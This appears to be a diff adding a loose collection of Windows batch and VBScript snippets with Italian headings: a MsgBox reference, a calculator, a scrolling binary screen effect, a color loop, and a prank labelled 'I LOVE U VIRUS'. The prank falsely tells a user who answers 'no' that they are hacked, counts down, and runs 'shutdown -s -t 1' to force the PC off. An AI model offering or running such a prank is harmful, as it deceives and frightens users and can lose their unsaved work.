@@ -1,0 +1,117 @@
+X=MsgBox("Message Description",0+16,"Title") 
+Instead of 0:
+0 = OK Button, 
+1 = OK / Cancel Button, 
+2 = Abort / Retry / Ignore Button, 
+3 = Yes / No / Cancel Button, 
+4 = Yes / No Button, 
+5 = Retry / Cancel Button
+
+Instead of 16:
+
+16 = Critical Icon, 
+32 = Help Icon, 
+48 = Warning Icon, 
+64 = Information Icon,
+CALCOLATRICE
+@echo off
+@title calcolatrice
+color 0a
+:1
+echo inserisci l'operazione:
+REM set /p
+set /p operazione=
+set /a risultato = %operazione%
+echo.
+echo il risultato di %operazione% è %risultato%
+echo.
+PAUSE
+goto :1
+CODE
+@echo off
+TITLE Code
+color 0a
+:SCROLLR
+echo 0010110001010101101010001010101010101010101100001010110101110100010011011010101011010101110000111010101010111100
+echo 1110001010100001001001001010010001010000100101001001010010010100101010101110101100101010101011111000100101010110
+echo 0101101010101111011010101111110101000101101111001001001001010111110010001010111111010101001011111101001010011111
+goto SCROLLR
+ATTACCHI DI COLORI
+:1
+color 1a
+color 2c
+color 3b
+color 7d
+color 5f
+goto :1
+I LOVE U VIRUS
+@echo off
+color 57
+echo Hey, do you love me (answer only yes or no)
+set /p love=
+if %love%==yes goto love
+if %love%==no goto hate
+:love
+echo i love you too
+echo meet u soon :)
+pause
+exit
+:hate
+echo But i love you........hehehehehehee
+echo You are hacked
+echo Your pc will crash in 10 seconds
+echo 10
+
+
+
+echo 9
+
+
+
+
+
+echo 8
+
+
+
+
+echo 7
+
+
+
+
+echo 6
+
+
+
+
+echo 5
+
+
+
+echo 4
+
+
+
+
+echo 3
+
+
+
+
+echo 2
+
+
+
+
+echo 1
+
+
+
+
+echo 0
+CreateObject("WScript.Shell").Run "nome file .bat"
+
+
+
+shutdown -s -t 1
